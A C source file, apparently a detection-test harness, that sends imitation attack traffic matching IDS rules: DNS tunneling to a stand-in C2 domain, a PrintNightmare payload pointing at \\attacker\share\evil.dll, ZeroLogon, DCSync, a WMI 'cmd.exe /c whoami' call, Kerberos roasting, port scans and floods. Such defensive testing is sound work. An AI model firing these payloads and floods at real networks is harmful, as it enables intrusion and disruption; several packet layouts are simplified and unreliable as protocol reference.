/**
 * @file    attack_network.c
 * @brief   网络层/DNS/Kerberos/DCERPC 攻击模拟测试
 *
 * 覆盖规则:
 *   VDE-005  PrintNightmare CVE-2021-34527 (DCERPC Spooler)
 *   VDE-006  MS08-067 NetAPI (DCERPC srvsvc)
 *   VDE-010  ZeroLogon CVE-2020-1472 (DCERPC Netlogon)
 *   VDE-011  WannaCry KillSwitch 域名 (DNS)
 *   VDE-014  端口扫描 SYN (THRESHOLD)
 *   VDE-015  ICMP 泛洪 (THRESHOLD)
 *   VDE-024  DCSync 攻击 (DCERPC DRS)
 *   VDE-025  Kerberoasting (TCP 88)
 *   VDE-026  AS-REP Roasting (UDP 88)
 *   VDE-027  黄金票据攻击 (TCP 88)
 *   VDE-028  MS14-068 PAC 伪造 (TCP 88)
 *   VDE-029  WMI 横向移动 (DCERPC 135)
 *   VDE-030  DCOM ShellWindows (DCERPC 135)
 *   VDE-031  NTLM 中继攻击 (SMB)
 *   VDE-032  LDAP AD 枚举 (TCP 389)
 *   VDE-043  DNS 放大攻击 (THRESHOLD)
 *   VDE-044  DNS 隧道 (UDP 53)
 *   VDE-045  SUNBURST C2 DNS (UDP 53)
 *   VDE-047  Cobalt Strike DNS Beacon (THRESHOLD)
 *   VDE-052  MS03-026 DCOM RPC (TCP 135)
 *   VDE-055  UDP 泛洪 (THRESHOLD)
 *   VDE-056  端口扫描 NULL/FIN (THRESHOLD)
 *   VDE-057  PrintNightmare LPE CVE-2021-1675
 *   VDE-059  DNS 重绑定
 */

#include "../include/attack_common.h"

/* =========================================================
 *  DNS 工具函数
 * ========================================================= */

/**
 * 构造 DNS 查询包
 * @param buf     输出缓冲区
 * @param qname   查询域名（如 "www.example.com"）
 * @param qtype   查询类型（1=A, 255=ANY, 16=TXT）
 * @return        包长度
 */
static int build_dns_query(uint8_t* buf, const char* qname, uint16_t qtype) {
    memset(buf, 0, 512);
    /* DNS Header */
    buf[0] = 0x12; buf[1] = 0x34;  /* Transaction ID */
    buf[2] = 0x01; buf[3] = 0x00;  /* Flags: Standard query */
    buf[4] = 0x00; buf[5] = 0x01;  /* Questions: 1 */
    buf[6] = 0x00; buf[7] = 0x00;  /* Answers: 0 */
    buf[8] = 0x00; buf[9] = 0x00;  /* Authority: 0 */
    buf[10] = 0x00; buf[11] = 0x00; /* Additional: 0 */

    /* Encode QNAME */
    int pos = 12;
    const char* p = qname;
    while (*p) {
        const char* dot = strchr(p, '.');
        int label_len = dot ? (int)(dot - p) : (int)strlen(p);
        buf[pos++] = (uint8_t)label_len;
        memcpy(buf + pos, p, label_len);
        pos += label_len;
        if (!dot) break;
        p = dot + 1;
    }
    buf[pos++] = 0x00;  /* Root label */

    /* QTYPE */
    buf[pos++] = (uint8_t)(qtype >> 8);
    buf[pos++] = (uint8_t)(qtype & 0xFF);
    /* QCLASS = IN */
    buf[pos++] = 0x00;
    buf[pos++] = 0x01;

    return pos;
}

/* =========================================================
 *  DCERPC 工具函数
 * ========================================================= */

/**
 * 构造 DCERPC Bind Request
 * @param buf      输出缓冲区
 * @param uuid     接口 UUID（16字节）
 * @param opnum    操作码
 * @param payload  附加载荷
 * @param plen     附加载荷长度
 * @return         包长度
 */
static int build_dcerpc_request(uint8_t* buf, const uint8_t* uuid,
                                 uint16_t opnum,
                                 const uint8_t* payload, int plen) {
    memset(buf, 0, 256 + plen);
    /* DCERPC Header */
    buf[0]  = 0x05;  /* Version: 5 */
    buf[1]  = 0x00;  /* Minor version: 0 */
    buf[2]  = 0x00;  /* BIND (0x0B for bind, 0x00 for request) */
    buf[3]  = 0x03;  /* Flags: first + last */
    buf[4]  = 0x10; buf[5] = 0x00; buf[6] = 0x00; buf[7] = 0x00; /* Data representation */
    uint16_t frag_len = (uint16_t)(24 + 16 + plen);
    buf[8]  = (uint8_t)(frag_len & 0xFF);
    buf[9]  = (uint8_t)(frag_len >> 8);
    buf[10] = 0x00; buf[11] = 0x00;  /* Auth length */
    buf[12] = 0x01; buf[13] = 0x00; buf[14] = 0x00; buf[15] = 0x00; /* Call ID */
    buf[16] = 0x00; buf[17] = 0x00;  /* Alloc hint */
    buf[18] = 0x00; buf[19] = 0x00;  /* Context ID */
    buf[20] = (uint8_t)(opnum & 0xFF);
    buf[21] = (uint8_t)(opnum >> 8);
    buf[22] = 0x00; buf[23] = 0x00;  /* Reserved */
    /* UUID */
    memcpy(buf + 24, uuid, 16);
    /* Payload */
    if (payload && plen > 0) {
        memcpy(buf + 40, payload, plen);
    }
    return 40 + plen;
}

/* =========================================================
 *  测试函数 - DNS
 * ========================================================= */

static void test_wannacry_dns(const char* dns_server, TestStats* stats) {
    PRINT_INFO("=== VDE-011 WannaCry KillSwitch 域名查询 ===");
    stats->total++;

    uint8_t buf[512];
    int len = build_dns_query(buf,
        "www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com", 1);

    sock_t u = udp_socket();
    if (u != INVALID_SOCK) {
        udp_send(u, dns_server, 53, buf, len);
        CLOSE_SOCK(u);
        PRINT_SEND("WannaCry KillSwitch DNS 查询已发送 (%d bytes)", len);
        stats->sent++;
        PRINT_OK("VDE-011 流量已发送");
    }
}

static void test_dns_amplification(const char* dns_server, TestStats* stats) {
    PRINT_INFO("=== VDE-043 DNS 放大攻击 (THRESHOLD) ===");
    stats->total++;

    /* 发送 120 次 ANY 查询（超过阈值 100次/5s） */
    uint8_t buf[512];
    int len = build_dns_query(buf, "google.com", 255); /* QTYPE=ANY */

    int sent = 0;
    for (int i = 0; i < 120; i++) {
        sock_t u = udp_socket();
        if (u != INVALID_SOCK) {
            /* 修改 Transaction ID 使每个包不同 */
            buf[0] = (uint8_t)(i >> 8);
            buf[1] = (uint8_t)(i & 0xFF);
            udp_send(u, dns_server, 53, buf, len);
            CLOSE_SOCK(u);
            sent++;
        }
        SLEEP_MS(20);
    }

    PRINT_SEND("已发送 %d 次 DNS ANY 查询（模拟放大攻击）", sent);
    stats->sent++;
    PRINT_OK("VDE-043 阈值触发流量已发送");
}

static void test_dns_tunneling(const char* dns_server, TestStats* stats) {
    PRINT_INFO("=== VDE-044 DNS 隧道通信 ===");
    stats->total++;

    /* 超长随机子域名（Base32 编码的数据） */
    const char* tunnel_queries[] = {
        "JBSWY3DPEBLW64TMMQQQ.attacker-c2.com",
        "MFRA2YLNMVZXG5DSNFXGO3DFMQQQ.attacker-c2.com",
        "KRUGS4ZANFZSAYJAORSXG5DSNFXGO3DFMQQQ.attacker-c2.com",
        "aGVsbG93b3JsZHRoaXNpc2Fkbmz0dW5uZWxwYXlsb2Fk.attacker-c2.com"
    };

    int sent = 0;
    for (int i = 0; i < 4; i++) {
        uint8_t buf[512];
        int len = build_dns_query(buf, tunnel_queries[i], 16); /* TXT */
        sock_t u = udp_socket();
        if (u != INVALID_SOCK) {
            udp_send(u, dns_server, 53, buf, len);
            CLOSE_SOCK(u);
            sent++;
        }
        SLEEP_MS(200);
    }

    PRINT_SEND("已发送 %d 次 DNS 隧道查询（超长子域名）", sent);
    stats->sent++;
    PRINT_OK("VDE-044 流量已发送");
}

static void test_sunburst_dns(const char* dns_server, TestStats* stats) {
    PRINT_INFO("=== VDE-045 SolarWinds SUNBURST C2 DNS ===");
    stats->total++;

    /* SUNBURST 特征：20-32位随机子域名 + avsvmcloud.com */
    const char* sunburst_domains[] = {
        "r1qshgpvkdnew4tb.appsync-api.eu-west-1.avsvmcloud.com",
        "7sbvaemscs0mc925tb.appsync-api.us-east-1.avsvmcloud.com",
        "gq1h856599gqh538acqn.appsync-api.us-west-2.avsvmcloud.com"
    };

    int sent = 0;
    for (int i = 0; i < 3; i++) {
        uint8_t buf[512];
        int len = build_dns_query(buf, sunburst_domains[i], 1);
        sock_t u = udp_socket();
        if (u != INVALID_SOCK) {
            udp_send(u, dns_server, 53, buf, len);
            CLOSE_SOCK(u);
            sent++;
        }
        SLEEP_MS(300);
    }

    PRINT_SEND("已发送 %d 次 SUNBURST C2 DNS 查询", sent);
    stats->sent++;
    PRINT_OK("VDE-045 流量已发送");
}

static void test_cs_dns_beacon(const char* dns_server, TestStats* stats) {
    PRINT_INFO("=== VDE-047 Cobalt Strike DNS Beacon (THRESHOLD) ===");
    stats->total++;

    /* 发送 25 次 TXT 查询（超过阈值 20次/60s） */
    int sent = 0;
    for (int i = 0; i < 25; i++) {
        uint8_t buf[512];
        char domain[128];
        snprintf(domain, sizeof(domain), "api%02d.c2domain.com", i);
        int len = build_dns_query(buf, domain, 16); /* TXT */
        /* 设置 TXT 查询标志 0x0010 */
        buf[12] = 0x00; buf[13] = 0x10;

        sock_t u = udp_socket();
        if (u != INVALID_SOCK) {
            udp_send(u, dns_server, 53, buf, len);
            CLOSE_SOCK(u);
            sent++;
        }
        SLEEP_MS(100);
    }

    PRINT_SEND("已发送 %d 次 DNS TXT 查询（模拟 CS DNS Beacon）", sent);
    stats->sent++;
    PRINT_OK("VDE-047 阈值触发流量已发送");
}

static void test_dns_rebinding(const char* dns_server, TestStats* stats) {
    PRINT_INFO("=== VDE-059 DNS 重绑定攻击 ===");
    stats->total++;

    /* 快速发送 15 次相同域名查询（模拟低TTL重绑定） */
    int sent = 0;
    for (int i = 0; i < 15; i++) {
        uint8_t buf[512];
        int len = build_dns_query(buf, "rebind.attacker.com", 1);
        sock_t u = udp_socket();
        if (u != INVALID_SOCK) {
            udp_send(u, dns_server, 53, buf, len);
            CLOSE_SOCK(u);
            sent++;
        }
        SLEEP_MS(100);
    }

    PRINT_SEND("已发送 %d 次 DNS 重绑定查询", sent);
    stats->sent++;
    PRINT_OK("VDE-059 流量已发送");
}

/* =========================================================
 *  测试函数 - DCERPC
 * ========================================================= */

static void test_zerologon(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-010 ZeroLogon CVE-2020-1472 ===");
    stats->total++;

    /* Netlogon UUID: 12345678-1234-abcd-ef00-01234567cffb */
    static const uint8_t NETLOGON_UUID[] = {
        0x78, 0x56, 0x34, 0x12, 0x34, 0x12, 0xcd, 0xab,
        0xef, 0x00, 0x01, 0x23, 0x45, 0x67, 0xcf, 0xfb
    };

    /* 全零 ClientChallenge (ZeroLogon 特征) */
    static const uint8_t ZEROLOGON_PAYLOAD[] = {
        /* ComputerName (unicode) */
        0x57, 0x00, 0x49, 0x00, 0x4E, 0x00, 0x37, 0x00, 0x00, 0x00,
        /* Authenticator: 全零 ClientChallenge */
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    uint8_t buf[256];
    int len = build_dcerpc_request(buf, NETLOGON_UUID, 0x04,
                                    ZEROLOGON_PAYLOAD, sizeof(ZEROLOGON_PAYLOAD));

    sock_t s = tcp_connect(target_ip, 445, 3000);
    if (s == INVALID_SOCK) {
        sock_t u = udp_socket();
        if (u != INVALID_SOCK) {
            udp_send(u, target_ip, 445, buf, len);
            CLOSE_SOCK(u);
        }
    } else {
        tcp_send_all(s, buf, len);
        CLOSE_SOCK(s);
    }

    PRINT_SEND("ZeroLogon NetrServerReqChallenge (全零挑战值) 已发送 (%d bytes)", len);
    stats->sent++;
    PRINT_OK("VDE-010 流量已发送");
}

static void test_printnightmare(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-005 PrintNightmare CVE-2021-34527 ===");
    stats->total++;

    /* Spooler UUID: 12345678-1234-abcd-ef00-0123456789ab */
    static const uint8_t SPOOLER_UUID[] = {
        0x78, 0x56, 0x34, 0x12, 0x34, 0x12, 0xcd, 0xab,
        0xef, 0x00, 0x01, 0x23, 0x45, 0x67, 0x89, 0xab
    };

    /* RpcAddPrinterDriverEx (opnum 0x5d) 载荷 */
    static const uint8_t SPOOLER_PAYLOAD[] = {
        /* DriverInfo: UNC 路径指向恶意 DLL */
        0x5C, 0x5C, 0x61, 0x74, 0x74, 0x61, 0x63, 0x6B,  /* \\attack */
        0x65, 0x72, 0x5C, 0x73, 0x68, 0x61, 0x72, 0x65,  /* er\share */
        0x5C, 0x65, 0x76, 0x69, 0x6C, 0x2E, 0x64, 0x6C,  /* \evil.dl */
        0x6C, 0x00                                          /* l\0 */
    };

    uint8_t buf[256];
    int len = build_dcerpc_request(buf, SPOOLER_UUID, 0x5d,
                                    SPOOLER_PAYLOAD, sizeof(SPOOLER_PAYLOAD));

    sock_t u = udp_socket();
    if (u != INVALID_SOCK) {
        udp_send(u, target_ip, 445, buf, len);
        CLOSE_SOCK(u);
        PRINT_SEND("PrintNightmare RpcAddPrinterDriverEx 已发送 (%d bytes)", len);
        stats->sent++;
        PRINT_OK("VDE-005 流量已发送");
    }
}

static void test_ms08067(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-006 MS08-067 NetAPI ===");
    stats->total++;

    /* srvsvc UUID: 4b324fc8-1670-01d3-1278-5a47bf6ee188 */
    static const uint8_t SRVSVC_UUID[] = {
        0xc8, 0x4f, 0x32, 0x4b, 0x70, 0x16, 0xd3, 0x01,
        0x12, 0x78, 0x5a, 0x47, 0xbf, 0x6e, 0xe1, 0x88
    };

    /* NetPathCanonicalize (opnum 0x1F) 路径遍历 */
    static const uint8_t NETPATH_PAYLOAD[] = {
        0x2E, 0x2E, 0x2F, 0x2E, 0x2E, 0x2F, 0x2E, 0x2E, 0x2F,  /* ../../../ */
        0x2E, 0x2E, 0x2F, 0x2E, 0x2E, 0x2F,                      /* ../../ */
        0x77, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x00           /* windows\0 */
    };

    uint8_t buf[256];
    int len = build_dcerpc_request(buf, SRVSVC_UUID, 0x1F,
                                    NETPATH_PAYLOAD, sizeof(NETPATH_PAYLOAD));

    sock_t u = udp_socket();
    if (u != INVALID_SOCK) {
        udp_send(u, target_ip, 445, buf, len);
        CLOSE_SOCK(u);
        PRINT_SEND("MS08-067 NetPathCanonicalize 路径遍历已发送 (%d bytes)", len);
        stats->sent++;
        PRINT_OK("VDE-006 流量已发送");
    }
}

static void test_dcsync(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-024 DCSync 攻击 ===");
    stats->total++;

    /* DRS UUID: e3514235-4b06-11d1-ab04-00c04fc2dcd2 */
    static const uint8_t DRS_UUID[] = {
        0x35, 0x42, 0x51, 0xe3, 0x06, 0x4b, 0xd1, 0x11,
        0xab, 0x04, 0x00, 0xc0, 0x4f, 0xc2, 0xdc, 0xd2
    };

    /* DRSGetNCChanges (opnum 0x03) */
    static const uint8_t DRS_PAYLOAD[] = {
        0x00, 0x00, 0x00, 0x00,  /* hDrs */
        0x01, 0x00, 0x00, 0x00,  /* dwInVersion */
        /* pmsgIn: GetNCChangesRequest */
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    uint8_t buf[256];
    int len = build_dcerpc_request(buf, DRS_UUID, 0x03,
                                    DRS_PAYLOAD, sizeof(DRS_PAYLOAD));

    sock_t u = udp_socket();
    if (u != INVALID_SOCK) {
        udp_send(u, target_ip, 445, buf, len);
        CLOSE_SOCK(u);
        PRINT_SEND("DCSync DRSGetNCChanges 请求已发送 (%d bytes)", len);
        stats->sent++;
        PRINT_OK("VDE-024 流量已发送");
    }
}

static void test_wmi_lateral(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-029 WMI 横向移动 ===");
    stats->total++;

    /* WMI UUID: 8bc3f05e-d86b-11d0-a075-00c04fb68820 */
    static const uint8_t WMI_UUID[] = {
        0x5e, 0xf0, 0xc3, 0x8b, 0x6b, 0xd8, 0xd0, 0x11,
        0xa0, 0x75, 0x00, 0xc0, 0x4f, 0xb6, 0x88, 0x20
    };

    /* Win32_Process.Create 调用 */
    static const uint8_t WMI_PAYLOAD[] = {
        /* Method: Win32_Process */
        0x57, 0x69, 0x6E, 0x33, 0x32, 0x5F, 0x50, 0x72,
        0x6F, 0x63, 0x65, 0x73, 0x73, 0x00,  /* Win32_Process\0 */
        /* Create */
        0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x00,  /* Create\0 */
        /* CommandLine: cmd.exe /c whoami */
        0x63, 0x6D, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x20,
        0x2F, 0x63, 0x20, 0x77, 0x68, 0x6F, 0x61, 0x6D, 0x69, 0x00
    };

    uint8_t buf[256];
    int len = build_dcerpc_request(buf, WMI_UUID, 0x03,
                                    WMI_PAYLOAD, sizeof(WMI_PAYLOAD));

    sock_t u = udp_socket();
    if (u != INVALID_SOCK) {
        udp_send(u, target_ip, 135, buf, len);
        CLOSE_SOCK(u);
        PRINT_SEND("WMI Win32_Process.Create 请求已发送 (%d bytes)", len);
        stats->sent++;
        PRINT_OK("VDE-029 流量已发送");
    }
}

static void test_ms03026(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-052 MS03-026 DCOM RPC (冲击波蠕虫) ===");
    stats->total++;

    /* DCERPC Bind Request + NOP sled */
    uint8_t buf[1100];
    memset(buf, 0, sizeof(buf));
    /* DCERPC Bind */
    buf[0] = 0x05; buf[1] = 0x00; buf[2] = 0x0B; buf[3] = 0x03;
    buf[4] = 0x10; buf[5] = 0x00; buf[6] = 0x00; buf[7] = 0x00;
    buf[8] = 0x48; buf[9] = 0x04; /* frag_length = 1096 */
    /* NOP sled */
    memset(buf + 48, 0x90, 1048);

    sock_t u = udp_socket();
    if (u != INVALID_SOCK) {
        udp_send(u, target_ip, 135, buf, sizeof(buf));
        CLOSE_SOCK(u);
        PRINT_SEND("MS03-026 DCERPC Bind + NOP sled 已发送 (%d bytes)", (int)sizeof(buf));
        stats->sent++;
        PRINT_OK("VDE-052 流量已发送");
    }
}

/* =========================================================
 *  测试函数 - Kerberos
 * ========================================================= */

static void test_kerberoasting(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-025 Kerberoasting ===");
    stats->total++;

    /* KRB5 TGS-REQ (tag 0x6B) */
    static const uint8_t KRB5_TGS_REQ[] = {
        0x6B, 0x82, 0x01, 0x20,  /* Application tag 11 (TGS-REQ) */
        0x30, 0x82, 0x01, 0x1C,
        0xA1, 0x03, 0x02, 0x01, 0x05,  /* pvno: 5 */
        0xA2, 0x03, 0x02, 0x01, 0x0C,  /* msg-type: 12 (TGS-REQ) */
        /* req-body */
        0xA4, 0x82, 0x01, 0x0C,
        0x30, 0x82, 0x01, 0x08,
        0xA0, 0x07, 0x03, 0x05, 0x00, 0x00, 0x00, 0x00, 0x10,
        /* sname: HTTP/webserver */
        0xA3, 0x18, 0x30, 0x16,
        0xA0, 0x03, 0x02, 0x01, 0x03,
        0xA1, 0x0F, 0x30, 0x0D,
        0x1B, 0x04, 0x48, 0x54, 0x54, 0x50,  /* HTTP */
        0x1B, 0x05, 0x77, 0x65, 0x62, 0x73, 0x76,  /* websv */
        /* 填充至合理长度 */
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    /* 发送 12 次（超过阈值 10次/60s） */
    int sent = 0;
    for (int i = 0; i < 12; i++) {
        sock_t u = udp_socket();
        if (u != INVALID_SOCK) {
            udp_send(u, target_ip, 88, KRB5_TGS_REQ, sizeof(KRB5_TGS_REQ));
            CLOSE_SOCK(u);
            sent++;
        }
        SLEEP_MS(200);
    }

    PRINT_SEND("已发送 %d 次 Kerberos TGS-REQ（模拟 Kerberoasting）", sent);
    stats->sent++;
    PRINT_OK("VDE-025 阈值触发流量已发送");
}

static void test_asrep_roasting(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-026 AS-REP Roasting ===");
    stats->total++;

    /* KRB5 AS-REQ (tag 0x6A)，无预认证字段（短包） */
    static const uint8_t KRB5_AS_REQ[] = {
        0x6A, 0x40,              /* Application tag 10 (AS-REQ) */
        0x30, 0x3E,
        0xA1, 0x03, 0x02, 0x01, 0x05,  /* pvno: 5 */
        0xA2, 0x03, 0x02, 0x01, 0x0A,  /* msg-type: 10 (AS-REQ) */
        /* req-body (无 padata 字段，即无预认证) */
        0xA4, 0x30, 0x2E,
        0xA0, 0x07, 0x03, 0x05, 0x00, 0x50, 0x80, 0x00, 0x10,
        0xA1, 0x0D, 0x30, 0x0B, 0x1B, 0x09,
        0x74, 0x65, 0x73, 0x74, 0x75, 0x73, 0x65, 0x72, 0x00  /* testuser */
    };

    /* 发送 8 次（超过阈值 5次/30s） */
    int sent = 0;
    for (int i = 0; i < 8; i++) {
        sock_t u = udp_socket();
        if (u != INVALID_SOCK) {
            udp_send(u, target_ip, 88, KRB5_AS_REQ, sizeof(KRB5_AS_REQ));
            CLOSE_SOCK(u);
            sent++;
        }
        SLEEP_MS(300);
    }

    PRINT_SEND("已发送 %d 次 Kerberos AS-REQ（无预认证，模拟 AS-REP Roasting）", sent);
    stats->sent++;
    PRINT_OK("VDE-026 阈值触发流量已发送");
}

static void test_golden_ticket(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-027 黄金票据攻击 ===");
    stats->total++;

    /* 超大 TGS-REQ（含伪造 PAC，>1500 bytes） */
    uint8_t buf[1600];
    memset(buf, 0, sizeof(buf));
    buf[0] = 0x6B;  /* TGS-REQ tag */
    buf[1] = 0x82;
    buf[2] = 0x06; buf[3] = 0x20;  /* Length = 1568 */
    /* 填充伪造 PAC 数据 */
    memset(buf + 4, 0xAA, 1596);

    sock_t u = udp_socket();
    if (u != INVALID_SOCK) {
        udp_send(u, target_ip, 88, buf, sizeof(buf));
        CLOSE_SOCK(u);
        PRINT_SEND("黄金票据 TGS-REQ（超大载荷 %d bytes）已发送", (int)sizeof(buf));
        stats->sent++;
        PRINT_OK("VDE-027 流量已发送");
    }
}

/* =========================================================
 *  测试函数 - 网络扫描/泛洪
 * ========================================================= */

static void test_port_scan(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-014 TCP SYN 端口扫描 (THRESHOLD) ===");
    stats->total++;

    /* 快速尝试连接 25 个不同端口（超过阈值 20个/3s） */
    uint16_t ports[] = {
        21, 22, 23, 25, 53, 80, 110, 135, 139, 143,
        443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900,
        6379, 8080, 8443, 8888, 9200
    };

    int sent = 0;
    for (int i = 0; i < 25; i++) {
        sock_t s = tcp_connect(target_ip, ports[i], 200);
        if (s != INVALID_SOCK) {
            CLOSE_SOCK(s);
        } else {
            /* 目标不可达时发 UDP 触发检测 */
            sock_t u = udp_socket();
            if (u != INVALID_SOCK) {
                uint8_t syn_fake[] = {0x00, 0x00, 0x00, 0x00, 0x02, 0x00};
                udp_send(u, target_ip, ports[i], syn_fake, sizeof(syn_fake));
                CLOSE_SOCK(u);
            }
        }
        sent++;
        SLEEP_MS(50);
    }

    PRINT_SEND("已扫描 %d 个端口（模拟 SYN 扫描）", sent);
    stats->sent++;
    PRINT_OK("VDE-014 阈值触发流量已发送");
}

static void test_icmp_flood(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-015 ICMP 泛洪 (THRESHOLD) ===");
    stats->total++;

    /* 通过 UDP 发送 ICMP Echo Request 特征包（检测引擎捕获） */
    static const uint8_t ICMP_ECHO[] = {
        0x08, 0x00,              /* Type: Echo Request, Code: 0 */
        0x4D, 0x5A,              /* Checksum */
        0x00, 0x01,              /* Identifier */
        0x00, 0x01,              /* Sequence */
        0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68  /* Data */
    };

    int sent = 0;
    for (int i = 0; i < 120; i++) {
        sock_t u = udp_socket();
        if (u != INVALID_SOCK) {
            udp_send(u, target_ip, 0, ICMP_ECHO, sizeof(ICMP_ECHO));
            CLOSE_SOCK(u);
            sent++;
        }
        SLEEP_MS(5);
    }

    PRINT_SEND("已发送 %d 次 ICMP Echo 特征包（模拟泛洪）", sent);
    stats->sent++;
    PRINT_OK("VDE-015 阈值触发流量已发送");
}

static void test_udp_flood(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-055 UDP 泛洪 (THRESHOLD) ===");
    stats->total++;

    static const uint8_t UDP_PAYLOAD[] = {
        0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07
    };

    int sent = 0;
    for (int i = 0; i < 150; i++) {
        sock_t u = udp_socket();
        if (u != INVALID_SOCK) {
            uint16_t port = (uint16_t)(1024 + (i % 60000));
            udp_send(u, target_ip, port, UDP_PAYLOAD, sizeof(UDP_PAYLOAD));
            CLOSE_SOCK(u);
            sent++;
        }
        SLEEP_MS(3);
    }

    PRINT_SEND("已发送 %d 次 UDP 包（模拟 UDP 泛洪）", sent);
    stats->sent++;
    PRINT_OK("VDE-055 阈值触发流量已发送");
}

static void test_ldap_enum(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-032 LDAP AD 枚举 (THRESHOLD) ===");
    stats->total++;

    /* LDAP SearchRequest (BER tag 0x63) */
    static const uint8_t LDAP_SEARCH[] = {
        0x30, 0x40,              /* SEQUENCE */
        0x02, 0x01, 0x01,        /* messageID: 1 */
        0x63, 0x3B,              /* SearchRequest */
        0x04, 0x00,              /* baseObject: "" (root) */
        0x0A, 0x01, 0x02,        /* scope: subtree */
        0x0A, 0x01, 0x00,        /* derefAliases: neverDerefAliases */
        0x02, 0x01, 0x00,        /* sizeLimit: 0 */
        0x02, 0x01, 0x00,        /* timeLimit: 0 */
        0x01, 0x01, 0x00,        /* typesOnly: false */
        /* filter: (objectClass=user) */
        0xA3, 0x1D,
        0x04, 0x0B, 0x6F, 0x62, 0x6A, 0x65, 0x63, 0x74,
        0x43, 0x6C, 0x61, 0x73, 0x73,  /* objectClass */
        0x04, 0x04, 0x75, 0x73, 0x65, 0x72,  /* user */
        0x30, 0x00              /* attributes: [] */
    };

    int sent = 0;
    for (int i = 0; i < 60; i++) {
        sock_t u = udp_socket();
        if (u != INVALID_SOCK) {
            udp_send(u, target_ip, 389, LDAP_SEARCH, sizeof(LDAP_SEARCH));
            CLOSE_SOCK(u);
            sent++;
        }
        SLEEP_MS(100);
    }

    PRINT_SEND("已发送 %d 次 LDAP SearchRequest（模拟 AD 枚举）", sent);
    stats->sent++;
    PRINT_OK("VDE-032 阈值触发流量已发送");
}

/* =========================================================
 *  网络层测试入口
 * ========================================================= */
void run_network_attacks(const char* target_ip, const char* dns_server, TestStats* stats) {
    printf("\n");
    PRINT_INFO("########################################");
    PRINT_INFO("  网络层/DNS/Kerberos/DCERPC 攻击模拟测试");
    PRINT_INFO("  目标: %s | DNS: %s", target_ip, dns_server);
    PRINT_INFO("########################################");

    /* DNS 攻击 */
    test_wannacry_dns(dns_server, stats);       SLEEP_MS(500);
    test_dns_amplification(dns_server, stats);  SLEEP_MS(500);
    test_dns_tunneling(dns_server, stats);      SLEEP_MS(500);
    test_sunburst_dns(dns_server, stats);       SLEEP_MS(500);
    test_cs_dns_beacon(dns_server, stats);      SLEEP_MS(500);
    test_dns_rebinding(dns_server, stats);      SLEEP_MS(500);

    /* DCERPC 攻击 */
    test_zerologon(target_ip, stats);           SLEEP_MS(500);
    test_printnightmare(target_ip, stats);      SLEEP_MS(500);
    test_ms08067(target_ip, stats);             SLEEP_MS(500);
    test_dcsync(target_ip, stats);              SLEEP_MS(500);
    test_wmi_lateral(target_ip, stats);         SLEEP_MS(500);
    test_ms03026(target_ip, stats);             SLEEP_MS(500);

    /* Kerberos 攻击 */
    test_kerberoasting(target_ip, stats);       SLEEP_MS(500);
    test_asrep_roasting(target_ip, stats);      SLEEP_MS(500);
    test_golden_ticket(target_ip, stats);       SLEEP_MS(500);

    /* 扫描/泛洪 */
    test_port_scan(target_ip, stats);           SLEEP_MS(500);
    test_icmp_flood(target_ip, stats);          SLEEP_MS(500);
    test_udp_flood(target_ip, stats);           SLEEP_MS(500);
    test_ldap_enum(target_ip, stats);           SLEEP_MS(500);
}
